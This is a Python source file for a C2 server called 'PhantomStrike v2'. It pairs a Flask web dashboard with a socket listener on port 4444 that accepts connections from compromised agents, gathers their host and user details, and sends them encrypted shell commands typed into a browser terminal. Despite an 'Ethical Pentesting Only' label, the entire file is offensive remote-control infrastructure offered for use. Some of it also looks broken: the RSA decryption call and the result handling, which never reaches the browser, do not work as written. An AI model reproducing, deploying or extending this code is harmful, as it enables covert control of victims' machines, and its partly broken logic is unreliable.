#!/usr/bin/env python3
"""
PhantomStrike v2 - Web C2 Panel
Flask Dashboard | Real-Time | Multi-Agent
Ethical Pentesting Only
"""

from flask import Flask, render_template, request, jsonify, session
import socket
import threading
import json
import base64
import time
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from datetime import datetime

app = Flask(__name__)
app.secret_key = get_random_bytes(24)

# === RSA & Agents ===
key = RSA.generate(2048)
private_key = key
public_key = key.publickey()

agents = {}
agent_lock = threading.Lock()
command_queue = {}  # agent_id: [commands]

# === Encryption ===
def encrypt_aes(key, msg):
    cipher = AES.new(key, AES.MODE_EAX)
    ct, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ct).decode()

def decrypt_aes(key, data):
    raw = base64.b64decode(data)
    nonce, tag, ct = raw[:16], raw[16:32], raw[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag).decode()

# === HTML Templates ===
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PhantomStrike C2</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: #0d0d0d; color: #0f0; font-family: 'Courier New'; }
    .card { background: #1a1a1a; border: 1px solid #0f0; }
    .terminal { background: #000; color: #0f0; padding: 15px; height: 300px; overflow-y: auto; }
    .agent-id { color: #0f0; font-weight: bold; }
  </style>
</head>
<body>
<div class="container mt-4">
  <h1 class="text-center mb-4">
    PhantomStrike C2 <small class="text-muted">v2 Web Panel</small>
  </h1>

  <div class="row">
    <div class="col-md-4">
      <div class="card">
        <div class="card-header">Active Agents</div>
        <div class="card-body" id="agents-list">
          <p class="text-muted">Waiting for agents...</p>
        </div>
      </div>

      <div class="card mt-3">
        <div class="card-header">C2 Public Key</div>
        <div class="card-body">
          <textarea class="form-control" rows="5" readonly id="pubkey">{{ pubkey }}</textarea>
          <button class="btn btn-sm btn-outline-success mt-2" onclick="copyKey()">Copy</button>
        </div>
      </div>
    </div>

    <div class="col-md-8">
      <div class="card">
        <div class="card-header">
          Terminal <span id="current-agent" class="agent-id"></span>
        </div>
        <div class="card-body">
          <div class="terminal" id="output">> Select an agent to begin.</div>
          <form id="cmd-form">
            <div class="input-group mt-3">
              <input type="text" class="form-control" placeholder="Enter command..." id="cmd-input">
              <button class="btn btn-outline-danger" type="submit">Send</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
let selectedAgent = null;
const output = document.getElementById('output');
const agentsList = document.getElementById('agents-list');
const currentAgent = document.getElementById('current-agent');

function copyKey() {
  const key = document.getElementById('pubkey');
  key.select();
  document.execCommand('copy');
  alert('Public key copied!');
}

function addMessage(msg, type = 'output') {
  const div = document.createElement('div');
  div.innerHTML = msg.replace(/\\n/g, '<br>');
  div.className = type === 'cmd' ? 'text-warning' : 'text-success';
  output.appendChild(div);
  output.scrollTop = output.scrollHeight;
}

function updateAgents() {
  fetch('/api/agents')
    .then(r => r.json())
    .then(data => {
      agentsList.innerHTML = '';
      if (data.agents.length === 0) {
        agentsList.innerHTML = '<p class="text-muted">No agents online.</p>';
        return;
      }
      data.agents.forEach(a => {
        const btn = document.createElement('button');
        btn.className = 'btn btn-sm btn-outline-success me-2 mb-2';
        btn.innerText = a.id.split('_')[0];
        btn.onclick = () => {
          selectedAgent = a.id;
          currentAgent.innerText = a.id;
          output.innerHTML = `<div>> Connected to ${a.id}</div>`;
          addMessage(`Host: ${a.info.host} | User: ${a.info.user}`);
        };
        agentsList.appendChild(btn);
      });
    });
}

document.getElementById('cmd-form').onsubmit = (e) => {
  e.preventDefault();
  const cmd = document.getElementById('cmd-input').value.trim();
  if (!cmd || !selectedAgent) return;
  fetch('/api/send', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({agent: selectedAgent, cmd: cmd})
  });
  addMessage(`$ ${cmd}`, 'cmd');
  document.getElementById('cmd-input').value = '';
};

setInterval(updateAgents, 2000);
updateAgents();
</script>
</body>
</html>
"""

# === API Routes ===
@app.route('/')
def index():
    return HTML_TEMPLATE.replace('{{ pubkey }}', public_key.export_key().decode())

@app.route('/api/agents')
def get_agents():
    with agent_lock:
        agent_list = []
        for aid, data in agents.items():
            agent_list.append({
                "id": aid,
                "info": data.get("info", {})
            })
    return jsonify({"agents": agent_list})

@app.route('/api/send', methods=['POST'])
def send_command():
    data = request.json
    agent_id = data['agent']
    cmd = data['cmd']
    with agent_lock:
        if agent_id in agents:
            command_queue.setdefault(agent_id, []).append(cmd)
    return jsonify({"status": "queued"})

# === Background Listener ===
def socket_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(10)
    print("[+] Web C2 listener started on :4444")

    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_agent, args=(conn, addr), daemon=True).start()

def handle_agent(conn, addr):
    agent_id = None
    aes_key = None
    info = {}

    try:
        enc_key = conn.recv(4096)
        aes_key = private_key.decrypt(enc_key)
        agent_id = f"{addr[0]}_{int(time.time())}"

        # Get system info
        conn.send(encrypt_aes(aes_key, "sysinfo").encode())
        enc_info = conn.recv(4096).decode()
        info = json.loads(decrypt_aes(aes_key, enc_info))

        with agent_lock:
            agents[agent_id] = {
                "conn": conn, "addr": addr, "aes": aes_key,
                "last_seen": time.time(), "info": info
            }

        print(f"[+] Agent {agent_id} online")

        while True:
            time.sleep(1)
            with agent_lock:
                if agent_id in command_queue and command_queue[agent_id]:
                    cmd = command_queue[agent_id].pop(0)
                else:
                    cmd = None

            if cmd:
                conn.send(encrypt_aes(aes_key, cmd).encode())
                if cmd == "exit":
                    break

                try:
                    enc_res = conn.recv(16384).decode()
                    result = decrypt_aes(aes_key, enc_res)
                    # Results printed in browser
                except:
                    break

            with agent_lock:
                if agent_id in agents:
                    agents[agent_id]["last_seen"] = time.time()

    except Exception as e:
        print(f"[-] Agent error: {e}")
    finally:
        with agent_lock:
            agents.pop(agent_id, None)
            command_queue.pop(agent_id, None)
        conn.close()

# === Start ===
if __name__ == "__main__":
    threading.Thread(target=socket_listener, daemon=True).start()
    print("[+] Web Panel: http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000, debug=False)
